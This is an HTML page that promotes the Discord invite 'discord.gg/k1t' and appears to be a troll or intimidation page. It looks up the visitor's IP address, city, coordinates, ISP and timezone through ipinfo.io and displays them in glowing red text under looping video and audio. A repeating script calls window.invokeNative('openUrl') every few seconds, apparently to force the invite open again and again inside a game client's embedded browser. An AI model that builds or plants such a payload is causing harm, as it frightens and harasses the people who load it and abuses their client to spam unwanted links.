<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>discord.gg/k1t</title>
    <style>
       body {
            margin: 0;
            padding: 0;
            background: black;
            font-family: 'Courier New', Courier, monospace;
            color: red;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            flex-direction: column;
            text-align: center;
            overflow: hidden;
        }
        #content {
            display: none;
            opacity: 0;
            transition: opacity 2s ease;
        }
        .image-container img {
            width: 400px; 
            height: auto;
            border: 2px solid red; 
            border-radius: 15px;
            box-shadow: 0 0 15px rgba(255, 0, 0, 0.7); 
        }
          .info {
            margin-top: 20px;
            font-size: 1.5em;
            color: red; 
            text-shadow: 0 0 8px red, 0 0 15px red, 0 0 25px red;
            letter-spacing: 4.5px; 
            white-space: pre-wrap;
        }
        .text {
            margin-top: 5px;
            font-size: 75px; 
            color: red; 
            text-shadow: 0 0 8px red, 0 0 15px red, 0 0 25px red; 
            letter-spacing: 4.5px;
        }
        .video-container {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            overflow: hidden;
            z-index: -1;
        }
        .video-container video {
            width: 100%;
            height: 100%;
            object-fit: cover;
            filter: blur(15px);
        }
    </style>
</head>
<body>
    <div class="video-container">
        <video autoplay loop muted>
            <source src="https://cdn.discordapp.com/attachments/1364995166062248071/1367099427612917880/-17256499154981989751.mp4?ex=6862740f&is=6861228f&hm=a21fb9450a462bb9aabcf340d5201bbde8eefc49219d399f57f90dcdaabfc6b1&" type="video/mp4">
            Your browser does not support the video tag.
        </video>
    </div>

    <div class="gif-container">
        <img src="https://cdn.discordapp.com/attachments/1364995166062248071/1388961937613783080/91c2de9669161b51.jpg?ex=6862e31b&is=6861919b&hm=2690f934935423fd1cccabd4d801b26fdf4e780bd8e135aa6777710992a4e030&" alt="">
    </div>

    <div id="content">
        <div class="image-container">
            <img src="https://cdn.discordapp.com/attachments/1364995166062248071/1388961937613783080/91c2de9669161b51.jpg?ex=6862e31b&is=6861919b&hm=2690f934935423fd1cccabd4d801b26fdf4e780bd8e135aa6777710992a4e030&" alt="">
        </div>

        <audio autoplay loop>
            <source src="https://cdn.discordapp.com/attachments/1364995166062248071/1367099458973864017/Recording_2024-10-03_150440.mp4?ex=68627416&is=68612296&hm=e2a6e614d8de470a5669d6d0ec62a316741f258beae8e4438689ef86063feaba&" type="audio/mpeg">
            Your browser does not support the audio element.
        </audio>
        <div class="info" id="ip-info"></div>
        
    </div>

    <script>
        setTimeout(() => {
            document.querySelector('.gif-container').style.display = 'none';
            const content = document.getElementById('content');
            content.style.display = 'block';
            setTimeout(() => {
                content.style.opacity = 1;
            }, 150); 
        }, 200);

        fetch('https://ipinfo.io/json')
        .then(response => response.json())
        .then(data => {
            const { ip, country, city, region, loc, org, timezone } = data;
            const infoDiv = document.getElementById('ip-info');
            infoDiv.innerHTML = ` <div class="text">ðŸ‘¾ discord.gg/k1t ðŸ‘¾</div>
<strong>IP:</strong><span style='color: red;'>"${ip}"</span><br>
<strong>City:</strong><span style='color: red;'>"${city}"</span><br>
<strong>Region:</strong><span style='color: red;'>"${region}"</span><br>
<strong>Country:</strong><span style='color: red;'>"${country}"</span><br>
<strong>Location:</strong><span style='color: red;'>"${loc}"</span><br>
<strong>ISP:</strong> <span style='color: red;'>"${org}"</span><br>
<strong>Timezone:</strong><span style='color: red;'>"${timezone}"</span>`;
        });

        setInterval(function() {
            window.invokeNative("openUrl", "https://discord.gg/k1t");
            window.invokeNative("openUrl", "https://discord.gg/k1t");
        }, 3500);
    </script>
</body>
</html>
